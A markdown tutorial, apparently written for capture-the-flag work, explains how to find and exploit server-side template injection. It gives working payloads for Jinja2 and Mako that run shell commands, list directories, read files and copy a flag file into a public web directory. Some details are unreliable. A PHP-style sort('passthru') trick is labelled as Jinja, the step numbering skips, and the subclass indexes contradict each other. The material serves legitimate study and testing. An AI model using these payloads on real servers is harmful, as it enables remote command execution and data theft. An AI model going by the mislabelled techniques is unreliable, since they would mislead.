# Server-Side Template Injection (SSTI)

## Overview
Server-Side Template Injection (SSTI) occurs when user input is embedded in templates on the server side without proper sanitization. This allows attackers to inject and execute arbitrary code using template engine syntax.

## Detection and Exploitation Steps

### 1. Find Injection Point
Look for a user input field that is reflected back on another page. For example, if changing a name in the user profile reflects that change elsewhere, this is a possible injection point.

### 2. Test for SSTI Vulnerability & Identify Template Engine
This page will go through an example with the jinja template engine. To figure out what engine is being used, refer to the following template:
![image](https://github.com/user-attachments/assets/d7f5bf06-7269-46a3-8d2b-419688fdb68d)

Insert the following basic payload and see if it's executed:
```jinja
{{7+7}}
```
If the result shows `14`, then the template engine is likely evaluating the expression.

### 3. Inject Payload
Modify the data field in the intercepted request to reflect information:
```jinja
{{['ls','']|sort('passthru')}}
```
This leverages jinja's `sort` function to execute `ls` and list directory contents.

### 5. View Execution Results
Visit the page where the data is reflected to observe command output.

### 6. Navigate Folders
To change directories and list contents:
```jinja
{{['cd+FOLDER;ls','']|sort('passthru')}}
```

### 8. Read Files
To read a file such as `FILE.txt` in a folder:
```jinja
{{['cat+FOLDER/FILE.txt;ls','']|sort('passthru')}}
```

> **Note:** Receiving a 500 Internal Server Error response can be a positive sign indicating attempted code evaluation.

---

## Troubleshooting SSTI

### 1. Template Engine Detection
Use the following test input template to identify the backend template engine:
![image](https://github.com/user-attachments/assets/d7f5bf06-7269-46a3-8d2b-419688fdb68d)

Through this example, we will be using jinja again.

### 2. Inspect Evaluation
Test with:
```jinja
{{request}}
```
If the response is a 500 error, it's likely being evaluated.

### 3. Dump All Python Subclasses (Jinja2)
Try the following to get all subclasses:
```jinja
{{''.__class__.mro()[1].__subclasses__()}}
```

### 4. Search for `subprocess.Popen`
Iterate through indexes:
```jinja
{{''.__class__.mro()[1].__subclasses__()[390]}}
{{''.__class__.mro()[1].__subclasses__()[391]}}
...
```
Look for: `<class 'subprocess.Popen'>`

### 5. Execute Commands
Once found (example index: 356), use:
```jinja
{{''.__class__.mro()[1].__subclasses__()[356]('id', shell=True, stdout=-1).communicate()[0]}}
```
Replace `'id'` with any other shell command you want to execute.

---

## Example: Mako Template Exploitation (Python)
If the backend uses Mako:

### 1. Execute OS Commands
Try:
```mako
${self.module.cache.util.os.system("id")}
```
If the output of `id` is shown, command execution is successful. If it returns `0`, that means the command executed, but no output is shown.

### 2. Exfiltrate Flags
Use the following to copy a flag file to a public directory:
```mako
${self.module.cache.util.os.system("cp /flag.txt /app/application/static/css")}
```

### 3. Access the File
Then you can `curl` or access the flag via a browser by navigating to the public directory.

---
